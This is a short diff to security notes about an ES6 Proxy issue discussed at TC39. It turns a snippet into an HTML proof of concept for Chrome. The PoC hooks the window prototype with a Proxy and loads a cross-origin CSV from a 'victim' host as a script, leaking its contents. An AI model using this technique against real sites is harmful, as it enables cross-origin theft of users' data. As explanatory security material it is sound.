@@ -19,10 +19,13 @@ TC39 discuss about potential security issue of ES6 Proxy.
 
 POC on Chrome:
 
-```js
+```html
+<script>
 window.__proto__ = Proxy.create({
     get: function(target, name) {console.log("data=" + name)}
 });
+</script>
+<script src="http://victim/test.csv"></script>
 ```
 
 Firefox lock down `Object.prototype`.
